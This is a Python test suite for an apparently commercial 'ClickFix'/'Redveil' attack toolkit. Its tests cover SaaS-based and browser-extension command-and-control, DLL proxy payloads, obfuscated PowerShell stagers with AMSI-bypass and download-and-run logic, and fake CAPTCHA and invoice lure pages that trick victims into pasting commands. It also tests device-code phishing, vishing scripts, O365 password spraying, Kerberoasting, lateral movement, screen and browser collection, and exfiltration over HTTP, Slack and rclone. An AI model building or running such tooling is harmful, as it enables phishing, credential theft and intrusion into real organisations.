# language: Python 3.11+, file: tests/test_cf.py
# *regression suite for the P0/P1 fixes*
from __future__ import annotations

import asyncio
import io
import json
import re
import sys
import time
import zipfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from cf.c2 import LegitServiceC2
from cf.cli import parse_args
from cf.delivery import SaaSNotifyDelivery
from cf.ext import ExtensionC2
from cf.lure import SCENARIOS, LureBuilder
from cf.payload import PayloadFactory, exports_from_dll
from cf.relay import CloudRelay
from cf.stager import KINDS, Stager
from cf.store import Store
from cf.util import write_text


class NullStore:
    def __init__(self) -> None:
        self.events: list[tuple] = []
        self.beacons: dict[str, str] = {}

    def log_event(self, bid, cid, kind, payload=""):
        self.events.append((bid, cid, kind, payload))

    def set_beacon_state(self, bid, state, cid=""):
        self.beacons[bid] = state


# ─── P0: real token reaches the header ───
@pytest.mark.parametrize(
    "service,expected",
    [
        ("slack", "Bearer REAL_TOKEN"),
        ("notion", "Bearer REAL_TOKEN"),
        ("github", "Bearer REAL_TOKEN"),
        ("dropbox", "Bearer REAL_TOKEN"),
        ("discord", "Bot REAL_TOKEN"),
    ],
)
def test_headers_send_operator_token(service, expected):
    c2 = LegitServiceC2(
        NullStore(), "c1", service, "REAL_TOKEN", channel="C1", repo="a/b"
    )
    assert c2._headers()["Authorization"] == expected


def test_notion_version_only_on_notion():
    slack = LegitServiceC2(NullStore(), "c1", "slack", "T", channel="C1")
    notion = LegitServiceC2(NullStore(), "c1", "notion", "T", channel="C1")
    assert "Notion-Version" not in slack._headers()
    assert notion._headers()["Notion-Version"] == "2022-06-28"


# ─── P0: batch filters kwargs instead of exploding ───
def test_run_batch_tolerates_extra_keys():
    delivery = SaaSNotifyDelivery(NullStore(), "c1", "slack", "T")
    seen: list[dict] = []

    async def fake_deliver(email, **kwargs):
        seen.append({"email": email, **kwargs})
        return {"ok": True}

    delivery.deliver = fake_deliver  # type: ignore[method-assign]
    targets = [
        {"email": "a@b.c", "message": "hi", "bid": "tok1", "channel_name": "x"},
        {"email": "d@e.f", "message": "hi", "bid": "tok2", "channel_name": "y",
         "unexpected": 1},
    ]
    res = asyncio.run(delivery.run_batch(targets))
    assert res["sent"] == 2
    assert res["failed"] == 0
    assert seen[0]["bid"] == "tok1"


def test_deliver_filters_to_handler_signature():
    delivery = SaaSNotifyDelivery(NullStore(), "c1", "teams", "T")

    async def fake(target_email, invite_text, redirect_url):
        return {"ok": True, "n": len(invite_text)}

    delivery.deliver_teams = fake  # type: ignore[method-assign]
    res = asyncio.run(
        delivery.deliver(
            "x@y.z",
            invite_text="open the link",
            redirect_url="https://x",
            bid="tok",
            junk="ignored",
        )
    )
    assert res["ok"] is True


# ─── P0: utf-8 writes survive Windows codepages ───
def test_write_text_handles_box_drawing(tmp_path):
    payload = PayloadFactory._payload_hpp_source()
    assert "─" in payload  # cp1252 cannot encode this
    p = write_text(tmp_path / "payload_factory.hpp", payload)
    assert p.read_text(encoding="utf-8") == payload


# ─── P0: dll proxy ───
def test_exports_from_system_dll():
    import os

    dll = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32" / "vbscript.dll"
    if not dll.exists():
        pytest.skip("vbscript.dll missing")
    exports = exports_from_dll(dll)
    names = [e["name"] for e in exports if e["name"]]
    assert names, "expected named exports"
    assert all(e["ordinal"] > 0 for e in exports)


def test_proxy_def_forwarder_shape(tmp_path):
    import os

    dll = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32" / "vbscript.dll"
    if not dll.exists():
        pytest.skip("vbscript.dll missing")
    res = PayloadFactory.generate_dll_proxy(str(dll), str(tmp_path / "build"))
    def_text = (tmp_path / "build" / "proxy.def").read_text(encoding="utf-8")
    assert def_text.startswith("LIBRARY vbscript\nEXPORTS")
    assert "vbscript.dll." in def_text
    assert "C:\\" not in def_text, "forwarders must not carry full paths"
    assert res["forwarded"] > 0
    assert (tmp_path / "build" / "proxy.cpp").exists()
    assert (tmp_path / "build" / "build.bat").exists()


def test_proxy_rejects_dll_without_named_exports(tmp_path):
    with pytest.raises(ValueError):
        PayloadFactory.generate_dll_proxy(
            "dummy", str(tmp_path), exports=[{"ordinal": 1, "name": None}]
        )


# ─── P0: extension package ───
def test_extension_zip_is_complete(tmp_path):
    out = tmp_path / "ext.zip"
    ExtensionC2.build_zip(str(out), "wss://c2.example/ws", "dev-1")
    with zipfile.ZipFile(out) as z:
        names = set(z.namelist())
        manifest = json.loads(z.read("manifest.json"))
        bg = z.read("bg.js").decode("utf-8")  # must be valid utf-8
        content = z.read("content.js").decode("utf-8")
        inject = z.read("inject.js").decode("utf-8")
        cfg = json.loads(z.read("config.json"))
    assert {"manifest.json", "bg.js", "content.js", "inject.js", "config.json"} <= names
    for script in manifest["background"], *manifest["content_scripts"]:
        target = script.get("service_worker") or script.get("js", [""])[0]
        assert target in names, f"{target} declared but not packaged"
    assert "onMessage" in bg
    assert "ws://" not in json.dumps(cfg) or cfg["ws"].startswith("ws")
    assert cfg["ingest"].startswith("http")
    assert "found_header" in content and "__cf" in inject
    assert "wss://c2.example/ws" not in bg, "secrets live in config.json"


def test_extension_zip_leaves_no_tempdirs(tmp_path):
    import tempfile

    before = set(Path(tempfile.gettempdir()).glob("ext-*"))
    ExtensionC2.build_zip(str(tmp_path / "e.zip"), "wss://x/ws", "id")
    after = set(Path(tempfile.gettempdir()).glob("ext-*"))
    assert before == after


# ─── clickfix core: stagers ───
def test_every_stager_kind_has_a_command():
    for kind in KINDS:
        cmd = Stager.command(kind, "http://h/s/k/tok")
        assert cmd and " " in cmd
        assert len(cmd) < 2048, "win+r input is bounded"


def test_psenc_hides_url_from_command_line():
    cmd = Stager.command("psenc", "http://h/s/psenc/tok")
    assert "http://h" not in cmd
    assert "-enc " in cmd


def test_loader_body_and_callbacks():
    for kind in ("ps", "psenc"):
        ctype, body = Stager.loader(
            kind, token="tok", hit_url="http://h/hit/tok",
            stage2_url="http://h/stage2", stage2_type="ps",
        )
        assert ctype.startswith("text/plain")
        assert "http://h/hit/tok" not in body  # chunked, never whole
        assert _reassembled_literals(body) == ["http://h/hit/tok", "http://h/stage2"]
        assert "DownloadString" in body
        assert "AmsiUtils" in body
    ctype, hta = Stager.loader(
        "hta", token="t", hit_url="http://h/hit/t", stage2_url="",
        stage2_type="none",
    )
    assert "application/hta" in ctype and "Window_OnLoad" in hta
    ctype, sct = Stager.loader(
        "sct", token="t", hit_url="http://h/hit/t", stage2_url="",
        stage2_type="none",
    )
    assert "text/xml" in ctype and "<registration" in sct


def _reassembled_literals(body: str) -> list[str]:
    """Join `'a'+'bc'` chunks the way the loader itself does at runtime."""
    groups = re.findall(r"((?:'[^']*'\s*\+\s*)+'[^']*')", body)
    return ["".join(re.findall(r"'([^']*)'", g)) for g in groups]


def test_loader_rejects_unknown_stage2():
    with pytest.raises(ValueError):
        Stager.loader("ps", token="t", hit_url="u", stage2_type="weird")


# ─── clickfix core: lures ───
def test_every_scenario_renders_clean():
    for scenario in SCENARIOS:
        html = LureBuilder.render(
            scenario,
            token="TOKEN123",
            command="powershell -enc AAAA",
            continue_url="https://example.com",
            locale="fr",
        )
        assert "TOKEN123" in html
        assert "__" not in _leftover_placeholders(html)
        assert "navigator.clipboard" in html
        assert "Win" in html or "Windows key" in html
        assert "<script" in html


def _leftover_placeholders(html: str) -> str:
    return ",".join(re.findall(r"__[A-Z0-9_]+__", html))


def test_unknown_scenario_raises():
    with pytest.raises(ValueError):
        LureBuilder.render("nope", token="t", command="c")


# ─── relay ───
def test_beacon_client_quotes_secrets():
    script = CloudRelay.beacon_client("http://h/f?a=1", "it's-a-key")
    assert "it''s-a-key" in script
    assert "$k='it''s-a-key'" in script


def test_handlers_have_constant_time_key_check():
    aws = CloudRelay.aws_lambda_handler()
    azure = CloudRelay.azure_function_handler()
    for src in (aws, azure):
        assert "hmac.compare_digest" in src
    # only the handler that execs operator code needs the size cap
    assert "MAX_CODE" in aws and "exec(compile(" in aws
    assert "exec(" not in azure


# ─── store ───
def test_store_funnel_and_status(tmp_path):
    with Store(tmp_path / "t.db") as store:
        cid = store.create_campaign("probe", scenario="captcha", base_url="http://h")
        tok = store.add_target(cid, email="a@b.c", label="alice")
        store.record_hit(tok, "lure", ip="1.2.3.4", ua="ua")
        store.set_status(tok, "clicked")
        store.log_event("b1", cid, "saas_delivery_slack", "{}")
        store.set_beacon_state("b1", "beaconed", cid)

        st = store.status(cid)
        assert st["targets"] == 1
        assert st["by_status"]["clicked"] == 1
        assert st["hits"]["lure"] == 1
        assert store.get_beacon_state("b1") == "beaconed"
        assert store.get_campaign(cid)["name"] == "probe"
        assert store.events(cid)[0]["kind"] == "saas_delivery_slack"


def test_store_rejects_unknown_status(tmp_path):
    with Store(tmp_path / "t.db") as store:
        cid = store.create_campaign("x")
        tok = store.add_target(cid)
        with pytest.raises(ValueError):
            store.set_status(tok, "wat")


# ─── cli ───
def test_parse_args_flags_and_repeats():
    pos, flags = parse_args(["deliver", "slack", "camp", "--field", "a=1",
                             "--field", "b=2", "--flag"])
    assert pos == ["deliver", "slack", "camp"]
    assert flags["field"] == ["a=1", "b=2"]
    assert flags["flag"] is True


def test_cli_help_and_unknown_command(capsys):
    from cf.cli import Cli

    assert Cli(["help"]).run() == 0
    assert "usage:" in capsys.readouterr().out
    assert Cli(["nope"]).run() == 2


def test_cli_stdout_survives_ansi_codepage(monkeypatch):
    """windows pipes default to cp1252; our messages carry utf-8 arrows."""
    from cf.cli import _configure_streams, ok

    raw = io.BytesIO()
    stream = io.TextIOWrapper(raw, encoding="cp1252", newline="")
    monkeypatch.setattr(sys, "stdout", stream)
    _configure_streams()
    ok("extension → out.zip")
    stream.flush()
    assert "→" in raw.getvalue().decode("utf-8")


def test_proxy_result_lists_generated_files_only(tmp_path):
    res = PayloadFactory.generate_dll_proxy(
        "vendor.dll",
        output_dir=str(tmp_path),
        exports=[{"ordinal": 1, "name": "Init", "forwarder": False}],
    )
    assert {Path(p).name for p in res["files"]} == {
        "payload_factory.hpp",
        "proxy.def",
        "proxy.cpp",
        "build.bat",
    }
    assert res["forwarded"] == 1


def test_resolve_pe_missing_file_raises(tmp_path):
    from cf.payload import _resolve_pe

    sample = tmp_path / "sample.bin"
    sample.write_bytes(b"MZ")
    assert _resolve_pe(sample) == sample
    with pytest.raises(FileNotFoundError):
        _resolve_pe("definitely-not-a-real-xyz.dll")


# ─── technique catalog ───
def test_catalog_is_valid_and_complete():
    from cf.techniques import TECHNIQUES, find, get, markdown, table, validate

    assert len(TECHNIQUES) >= 40
    assert validate() == []
    md = markdown()
    assert md.count("### ") == len(TECHNIQUES)
    assert len(table()) == len(TECHNIQUES)
    assert len(find(surface="winr")) >= 8
    assert len(find(serveable=True)) >= 10
    tech = get("winr-irm")
    assert tech.command_for("http://h", "tok") == Stager.command(
        "irm", "http://h/s/irm/tok"
    )
    for t in TECHNIQUES.values():
        cmd = t.command_for("https://h", "tok")
        assert "{" not in cmd and "}" not in cmd, t.id
        assert len(t.steps) >= 3
    with pytest.raises(KeyError):
        get("nope")


def test_new_stager_kinds_serve_the_ps_loader():
    for kind in ("irm", "curl", "certutil", "bitsadmin"):
        cmd = Stager.command(kind, "http://h/s/x/t")
        assert "http://h/s/x/t" in cmd
        ctype, body = Stager.loader(kind, token="t", hit_url="http://h/hit/t")
        assert "text/plain" in ctype
        assert "DownloadData" in body


def test_hta_and_gif_tokens_normalise():
    from cf.server import normalize_token

    assert normalize_token("tok") == "tok"
    assert normalize_token("tok.gif") == "tok"
    assert normalize_token("tok.hta") == "tok"


def test_lure_accepts_technique_steps():
    page = LureBuilder.render(
        "captcha", token="T", command="c", steps=["alpha", "beta", "gamma", "delta"]
    )
    assert page.count("<li>") == 4
    assert ">alpha<" in page and ">delta<" in page
    with pytest.raises(ValueError):
        LureBuilder.render("captcha", token="T", command="c", steps=[])


def test_settings_for_binds_technique(tmp_path):
    from cf.server import settings_for

    with Store(tmp_path / "t.db") as store:
        cid = store.create_campaign(
            "p",
            scenario="captcha",
            base_url="http://h",
            meta={"technique": "term-winx"},
        )
        camp = store.get_campaign(cid)
        settings = settings_for(store, camp)
        assert settings["kind"] == "irm"
        assert settings["steps"][0].startswith("Right-click the Start button")


def test_report_renders_funnel_and_iocs(tmp_path):
    from cf.report import build

    with Store(tmp_path / "t.db") as store:
        cid = store.create_campaign(
            "p",
            scenario="captcha",
            base_url="http://h",
            meta={"kind": "irm", "technique": "winr-irm"},
        )
        token = store.add_target(cid, email="a@b.c", label="x")
        store.record_hit(token, "lure", ip="1.2.3.4", ua="agent-x")
        md = build(store, cid)
        assert "engagement report" in md
        assert "http://h/l/" + token in md
        assert "1.2.3.4" in md and "agent-x" in md
        assert "winr-irm" in md
        with pytest.raises(KeyError):
            build(store, "missing")


def test_cli_technique_surface_and_report(tmp_path, capsys):
    from cf.cli import Cli

    db = str(tmp_path / "c.db")
    assert (
        Cli(
            [
                "--db",
                db,
                "campaign",
                "new",
                "p",
                "--technique",
                "term-winx",
                "--url",
                "http://h",
            ]
        ).run()
        == 0
    )
    assert Cli(["--db", db, "technique", "list", "--surface", "winr"]).run() == 0
    out = capsys.readouterr().out
    assert "winr-irm" in out and "SURFACE" in out
    assert Cli(["--db", db, "technique", "show", "term-winx"]).run() == 0
    assert "Win+X Terminal paste" in capsys.readouterr().out
    assert Cli(["--db", db, "report", "p"]).run() == 0
    assert "engagement report" in capsys.readouterr().out
    assert Cli(["--db", db, "technique", "show", "nope"]).run() == 1
    assert Cli(["--db", db, "campaign", "new", "q", "--technique", "nope"]).run() == 1


# ─── initial access / creds / lateral / collect / opsec ───


def test_device_code_flow_parses_and_classifies():
    from cf.access import AccessError, DeviceCodeFlow, classify

    assert classify({"error_description": "AADSTS50126: invalid credentials"}) == "invalid_credentials"
    assert classify("AADSTS50053: user locked") == "smart_lockout"
    assert classify({"error": "authorization_pending"}) == "authorization_pending"
    assert classify("random noise") == "unknown"
    flow = DeviceCodeFlow("client-123", tenant="contoso.onmicrosoft.com")
    assert "contoso" in flow.device_url and "devicecode" in flow.device_url
    assert "token" in flow.token_url
    with pytest.raises(AccessError):
        DeviceCodeFlow("")


def test_authorize_url_and_callback():
    from cf.access import authorize_url, parse_callback, vishing_script

    url = authorize_url("cid", tenant="t1", redirect_uri="https://x/oauth/cf", state="tok1")
    assert "client_id=cid" in url and "state=tok1" in url and "oauth2/v2.0/authorize" in url
    parsed = parse_callback({"code": "abc", "state": "tok1", "error": ""})
    assert parsed["code"] == "abc" and parsed["state"] == "tok1"
    lines = vishing_script("device_code", org="ACME", ticket="99")
    assert any("microsoft.com/device" in line for line in lines)
    mfa_lines = vishing_script("mfa", code="ABCD")
    assert any("ABCD" in line for line in mfa_lines)
    from cf.access import AccessError

    with pytest.raises(AccessError):
        vishing_script("nope")


def test_creds_generators_and_spray_guard():
    from cf.creds import GEN, CredsError, generator, spray_o365

    assert set(GEN) == {"kerberoast", "asrep", "adcs", "dpapi"}
    out = generator("kerberoast", target="dc01.corp.local", domain="corp.local")
    assert out["mitre"] == "T1558.003" and "4769" in out["telemetry"]
    assert "dc01" in out["command"]
    with pytest.raises(CredsError):
        generator("nope")
    with pytest.raises(CredsError):
        asyncio.run(spray_o365([], "pw"))


def test_lateral_collect_exfil_builders():
    from cf.collect import COLLECTORS, EXFIL, collector, exfil
    from cf.lateral import KINDS as LKINDS
    from cf.lateral import command

    assert set(LKINDS) >= {"pth", "winrm", "wmi", "sccm", "gpo"}
    out = command("winrm", "10.0.0.5", user="u", password="p", domain="D", payload="whoami")
    assert "10.0.0.5" in out["command"] and out["mitre"] == "T1021.006"
    assert set(COLLECTORS) >= {"screen", "files", "browser", "clipboard", "wifi"}
    scr = collector("screen")
    assert scr["mitre"] == "T1113" and "CopyFromScreen" in scr["command"]
    files = collector("files", path="$env:USERPROFILE", limit="5")
    assert "Compress-Archive" in files["command"]
    with pytest.raises(KeyError):
        collector("nope")
    assert set(EXFIL) >= {"http", "slack", "rclone"}
    ex = exfil("http", url="https://x/c", path="$env:TEMP\\s.zip")
    assert "Invoke-RestMethod" in ex["command"]
    with pytest.raises(KeyError):
        exfil("nope")


def test_opsec_preflight_offline():
    from cf.opsec import Check, format_checks, summary
    from cf.server import is_scanner

    assert is_scanner("python-requests/2.32") is True
    assert is_scanner("Mozilla/5.0") is False
    checks = [
        Check("dns", True, "1.2.3.4"),
        Check("headers", False, "cors=wide-open"),
    ]
    s = summary(checks)
    assert s == {"total": 2, "ok": 1, "warn": 1}
    text = format_checks(checks)
    assert "dns" in text and "WARN" in text


def test_stager_xor_roundtrip_and_obfuscated_loader():
    from cf.stager import Stager, xor_bytes, xor_key

    key = xor_key("tok123")
    assert len(key) == 16
    data = b"Write-Output 'stage2'"
    enc = xor_bytes(data, key)
    assert enc != data
    assert xor_bytes(enc, key) == data
    _ct, body = Stager.loader(
        "irm",
        token="tok123",
        hit_url="https://h/hit/tok123",
        stage2_url="https://h/stage2.ps1",
        stage2_type="ps",
        obfuscate=True,
    )
    assert "DownloadString" not in body
    assert "-bxor" in body and "byte[]" in body
    _ct2, body2 = Stager.loader(
        "irm",
        token="tok123",
        hit_url="https://h/hit/tok123",
        stage2_url="https://h/stage2.ps1",
        stage2_type="ps",
        obfuscate=False,
    )
    assert "DownloadString" in body2


def test_server_oauth_route_and_scanner_filter(tmp_path):
    from cf.server import LandingServer, is_scanner

    assert is_scanner("python-requests/2.32") is True
    assert is_scanner("Mozilla/5.0 (Windows NT 10.0)") is False
    assert is_scanner("curl/8.0") is True
    store = Store(str(tmp_path / "c.db"))
    cid = store.create_campaign("x", scenario="it_support", base_url="http://h")
    store.add_target(cid, email="a@b.c", label="x")
    server = LandingServer(store, filter_scanners=True)
    app = server.build_app()
    routes = {r.resource.canonical for r in app.router.routes()}
    assert "/oauth/cf" in routes
    assert "/s/{kind}/{token}" in routes
    store.close()


def test_report_csv_and_sigma_export(tmp_path, capsys, monkeypatch):
    from cf.cli import Cli
    from cf.license import issue, save
    from cf.report import csv_rows
    from cf.techniques import sigma_rules

    # csv/sigma export is a trial+ feature — license the run first
    lf = tmp_path / "lic.json"
    monkeypatch.setenv("CLICKFIX_LICENSE_FILE", str(lf))
    key, _ = issue("trial", licensee="tester")
    save(key)

    store = Store(str(tmp_path / "c.db"))
    cid = store.create_campaign("csv", scenario="it_support", base_url="http://h")
    token = store.add_target(cid, email="a@b.c", label="x")
    store.record_hit(token, "lure", ip="9.9.9.9", ua="agent-y")
    body = csv_rows(store, cid)
    assert "ts,campaign,token,kind,ip,ua" in body
    assert "9.9.9.9" in body and "lure" in body
    store.close()
    db = str(tmp_path / "s.db")
    assert Cli(["--db", db, "technique", "export", "--sigma"]).run() == 0
    out = capsys.readouterr().out
    assert "title: redveil" in out

    # demo tier: sigma + csv are gated, message names the upgrade path
    lf.unlink()
    from cf.license import deactivate

    deactivate()
    db2 = str(tmp_path / "d.db")
    assert Cli(["--db", db2, "technique", "export", "--sigma"]).run() == 1
    captured = capsys.readouterr()
    assert "upgrade" in (captured.out + captured.err).lower()
    assert Cli(["--db", db2, "campaign", "new", "p", "--url", "http://h"]).run() == 0
    assert Cli(["--db", db2, "report", "p", "--csv", str(tmp_path / "x.csv")]).run() == 1
    assert not (tmp_path / "x.csv").exists()


def test_cli_new_atrium_surfaces(tmp_path, capsys, monkeypatch):
    from cf.cli import Cli
    from cf.license import issue, save

    # the csv export at the end is tier-gated; run licensed
    lf = tmp_path / "lic.json"
    monkeypatch.setenv("CLICKFIX_LICENSE_FILE", str(lf))
    key, _ = issue("trial", licensee="tester")
    save(key)

    db = str(tmp_path / "c.db")
    # access consent prints an authorize url
    assert Cli(["--db", db, "access", "consent", "--client-id", "cid1", "--tenant", "t1"]).run() == 0
    out = capsys.readouterr().out
    assert "client_id=cid1" in out and "authorize" in out
    # vishing script
    assert Cli(["--db", db, "access", "vishing", "mfa", "--code", "WXYZ"]).run() == 0
    assert "WXYZ" in capsys.readouterr().out
    # lateral builder
    assert Cli(["--db", db, "lateral", "winrm", "10.0.0.9"]).run() == 0
    out = capsys.readouterr().out
    assert "10.0.0.9" in out and "T1021.006" in out
    # collect builder
    assert Cli(["--db", db, "collect", "screen"]).run() == 0
    assert "CopyFromScreen" in capsys.readouterr().out
    # exfil builder
    assert Cli(["--db", db, "exfil", "http", "--url", "https://x/c"]).run() == 0
    assert "Invoke-RestMethod" in capsys.readouterr().out
    # creds generator
    assert Cli(["--db", db, "creds", "kerberoast", "--target", "dc01"]).run() == 0
    assert "kerberoast" in capsys.readouterr().out.lower()
    # report csv
    assert Cli(["--db", db, "campaign", "new", "p", "--url", "http://h"]).run() == 0
    assert Cli(["--db", db, "report", "p", "--csv", str(tmp_path / "t.csv")]).run() == 0
    assert (tmp_path / "t.csv").read_text(encoding="utf-8").startswith("ts,campaign")


def test_campaign_profile_merges_meta(tmp_path):
    from cf.cli import Cli

    profile = tmp_path / "p.json"
    profile.write_text(json.dumps({"jitter": 0.4, "obfuscate": True, "kind": "irm"}), encoding="utf-8")
    db = str(tmp_path / "c.db")
    assert (
        Cli(
            [
                "--db",
                db,
                "campaign",
                "new",
                "p",
                "--profile",
                str(profile),
                "--url",
                "http://h",
            ]
        ).run()
        == 0
    )
    store = Store(db)
    camp = store.list_campaigns()[0]
    meta = json.loads(camp["meta"])
    assert meta["kind"] == "irm" and meta["obfuscate"] is True
    store.close()


# ─── licensing ───


def test_license_issue_parse_tamper_expire(tmp_path):
    from cf.license import KEY_PREFIX, LicenseError, issue, parse

    key, lic = issue("pro", licensee="ACME", days=365)
    assert key.startswith(KEY_PREFIX + ".")
    assert lic.tier == "pro" and lic.licensee == "ACME"
    assert lic.active and not lic.expired
    assert lic.has("relay") and not lic.watermark
    assert lic.days_left() > 300

    parsed = parse(key)
    assert parsed == lic

    tampered = key[:-4] + ("AAAA" if not key.endswith("AAAA") else "BBBB")
    with pytest.raises(LicenseError):
        parse(tampered)

    with pytest.raises(LicenseError):
        parse("garbage")

    _, expired = issue("trial", licensee="x", days=14, now=time.time() - 20 * 86400)
    with pytest.raises(LicenseError):
        parse(expired.key)


def test_license_tiers_and_demo(tmp_path):
    from cf.license import License, issue

    demo = License(tier="demo", licensee="", issued=0, expires=0)
    assert demo.watermark and demo.max_campaigns() == 2
    assert not demo.has("relay")

    _, trial = issue("trial", licensee="t")
    assert trial.max_campaigns() == 3 and trial.max_targets() == 10
    assert not trial.watermark

    _, team = issue("team", licensee="tm")
    assert team.has("multi-seat") and team.max_campaigns() == 0


def test_license_save_load_deactivate(tmp_path, monkeypatch):
    from cf import license as lic_mod

    lf = tmp_path / "lic.json"
    monkeypatch.setenv("CLICKFIX_LICENSE_FILE", str(lf))
    assert lic_mod.load() is None
    demo = lic_mod.effective()
    assert demo.tier == "demo"

    key, _ = lic_mod.issue("pro", licensee="ACME")
    lic_mod.save(key)
    loaded = lic_mod.load()
    assert loaded is not None and loaded.tier == "pro"
    assert lic_mod.effective().tier == "pro"

    assert lic_mod.deactivate() is True
    assert lic_mod.load() is None
    assert lic_mod.deactivate() is False


def test_cli_license_status_activate_deactivate(tmp_path, capsys):
    import os

    from cf.cli import Cli

    lf = str(tmp_path / "lic.json")
    db = str(tmp_path / "c.db")
    old = os.environ.get("CLICKFIX_LICENSE_FILE")
    os.environ["CLICKFIX_LICENSE_FILE"] = lf
    try:
        assert Cli(["--db", db, "license", "status"]).run() == 0
        out = capsys.readouterr().out
        assert "demo" in out and "activate" in out

        # issue a key, then activate it
        assert Cli(["--db", db, "license", "issue", "--tier", "trial", "--licensee", "X"]).run() == 0
        key = json.loads(capsys.readouterr().out)["key"]
        assert Cli(["--db", db, "license", "activate", key]).run() == 0
        capsys.readouterr()  # drain the "[+] activated" line
        assert Cli(["--db", db, "license", "status"]).run() == 0
        status = capsys.readouterr().out
        assert "trial" in status and "X" in status

        assert Cli(["--db", db, "license", "deactivate"]).run() == 0
    finally:
        if old is None:
            os.environ.pop("CLICKFIX_LICENSE_FILE", None)
        else:
            os.environ["CLICKFIX_LICENSE_FILE"] = old


def test_cli_demo_quota_blocks_third_campaign(tmp_path, capsys):
    import os

    from cf.cli import Cli

    lf = str(tmp_path / "lic.json")
    db = str(tmp_path / "c.db")
    old = os.environ.get("CLICKFIX_LICENSE_FILE")
    os.environ["CLICKFIX_LICENSE_FILE"] = lf
    try:
        # demo tier = max 2 campaigns
        assert Cli(["--db", db, "campaign", "new", "a", "--url", "http://h"]).run() == 0
        assert Cli(["--db", db, "campaign", "new", "b", "--url", "http://h"]).run() == 0
        assert Cli(["--db", db, "campaign", "new", "c", "--url", "http://h"]).run() == 1
        err_text = capsys.readouterr()
        assert "tier" in err_text.err or "upgrade" in err_text.err

        # activate trial (max 3 campaigns) → third one now succeeds
        key, _ = __import__("cf.license", fromlist=["issue"]).issue("trial", licensee="X")
        assert Cli(["--db", db, "license", "activate", key]).run() == 0
        assert Cli(["--db", db, "campaign", "new", "c", "--url", "http://h"]).run() == 0
    finally:
        if old is None:
            os.environ.pop("CLICKFIX_LICENSE_FILE", None)
        else:
            os.environ["CLICKFIX_LICENSE_FILE"] = old


def test_cli_demo_report_watermark(tmp_path, capsys):
    import os

    from cf.cli import Cli

    lf = str(tmp_path / "lic.json")
    db = str(tmp_path / "c.db")
    old = os.environ.get("CLICKFIX_LICENSE_FILE")
    os.environ["CLICKFIX_LICENSE_FILE"] = lf
    try:
        assert Cli(["--db", db, "campaign", "new", "p", "--url", "http://h"]).run() == 0
        assert Cli(["--db", db, "report", "p"]).run() == 0
        out = capsys.readouterr().out
        assert "DEMO BUILD" in out
    finally:
        if old is None:
            os.environ.pop("CLICKFIX_LICENSE_FILE", None)
        else:
            os.environ["CLICKFIX_LICENSE_FILE"] = old


# ─── pro gui ───


def test_gui_api_offline(tmp_path):
    from cf.gui import RedveilGUI
    from cf.store import Store

    db = str(tmp_path / "g.db")
    store = Store(db)
    gui = RedveilGUI(store, auth=False)
    app = gui.build_app()
    routes = {r.resource.canonical for r in app.router.routes()}
    assert "/" in routes
    assert "/api/overview" in routes
    assert "/api/campaigns" in routes
    assert "/api/techniques" in routes
    assert "/api/serve" in routes
    assert "/api/license" in routes
    assert "/api/report/{cid}" in routes
    store.close()


def test_gui_auth_rejects_bad_token(tmp_path):
    from cf.gui import RedveilGUI
    from cf.store import Store

    db = str(tmp_path / "g.db")
    store = Store(db)
    gui = RedveilGUI(store, auth=True)
    assert gui._check_token.__name__ == "_check_token"
    # direct middleware check
    from unittest.mock import MagicMock

    req = MagicMock()
    req.query = {"token": "wrong"}
    req.headers = {}
    assert gui._check_token(req) is False
    req.query = {"token": gui.token}
    assert gui._check_token(req) is True
    req.query = {}
    req.headers = {"X-Redveil-Token": gui.token}
    assert gui._check_token(req) is True
    store.close()


def test_gui_html_embeds_token(tmp_path):
    from cf.gui import GUI_HTML

    html = GUI_HTML.read_text(encoding="utf-8")
    assert "__TOKEN__" in html
    assert "Redveil" in html or "RED" in html
    assert "loadDash" in html
    assert "/overview" in html
    assert "/campaigns" in html


def test_cli_gui_help_lists_command(capsys):
    from cf.cli import Cli

    assert Cli(["help"]).run() == 0
    out = capsys.readouterr().out
    assert "gui" in out and "dashboard" in out.lower()


def test_scenarios_catalog():
    from cf.lure import SCENARIOS

    assert len(SCENARIOS) >= 16
    required = {"brand", "badge", "headline", "sub", "steps", "copy", "copied", "continue", "accent", "dark"}
    for name, spec in SCENARIOS.items():
        assert required <= spec.keys(), f"{name} missing {required - spec.keys()}"
        assert isinstance(spec["steps"], list) and len(spec["steps"]) >= 3
        assert spec["accent"].startswith("#")
        assert isinstance(spec["dark"], bool)


def test_gui_api_scenarios_route(tmp_path):
    from cf.gui import RedveilGUI
    from cf.store import Store

    store = Store(str(tmp_path / "g.db"))
    gui = RedveilGUI(store, auth=False)
    app = gui.build_app()
    routes = {r.resource.canonical for r in app.router.routes()}
    assert "/api/scenarios" in routes
    store.close()


def test_new_scenarios_render():
    from cf.lure import LureBuilder

    for sid in ("voicemail", "software_update", "cloud_sync", "printer_issue",
                 "vpn_disconnect", "meeting_invite", "invoice", "docusign",
                 "mfa_reset", "delivery", "tax_refund", "wifi_portal", "backup_failed"):
        html = LureBuilder.render(sid, token="T", command="c", continue_url="https://x", locale="fr")
        assert "<title>" in html
        assert "</html>" in html


# ─── pro gui: live server mode ───


def test_gui_sse_and_status_routes(tmp_path):
    from cf.gui import RedveilGUI
    from cf.store import Store

    store = Store(str(tmp_path / "g.db"))
    gui = RedveilGUI(store, auth=False)
    app = gui.build_app()
    routes = {r.resource.canonical for r in app.router.routes()}
    assert "/api/events" in routes
    assert "/api/status" in routes
    store.close()


def test_gui_broadcast_drops_oldest_not_newest(tmp_path):
    import asyncio

    from cf.gui import RedveilGUI
    from cf.store import Store

    store = Store(str(tmp_path / "g.db"))
    gui = RedveilGUI(store, auth=False)

    async def run():
        q: asyncio.Queue = asyncio.Queue(maxsize=2)
        gui._subs.add(q)
        for ip in ("1.1.1.1", "2.2.2.2", "3.3.3.3"):
            gui.broadcast("hit", {"ip": ip})
        return [q.get_nowait() for _ in range(q.qsize())]

    got = asyncio.run(run())
    assert [e["ip"] for e in got] == ["2.2.2.2", "3.3.3.3"]
    assert all(e["type"] == "hit" for e in got)
    store.close()


def test_gui_refuses_open_bind_without_auth(tmp_path):
    from cf.gui import RedveilGUI
    from cf.store import Store

    store = Store(str(tmp_path / "g.db"))
    try:
        RedveilGUI(store, host="0.0.0.0", auth=False)._require_local_auth()
    except ValueError as exc:
        assert "auth" in str(exc)
    else:
        raise AssertionError("routable bind without auth was accepted")
    # loopback without auth and routable with auth both stay legal
    RedveilGUI(store, host="127.0.0.1", auth=False)._require_local_auth()
    RedveilGUI(store, host="0.0.0.0", auth=True)._require_local_auth()
    store.close()


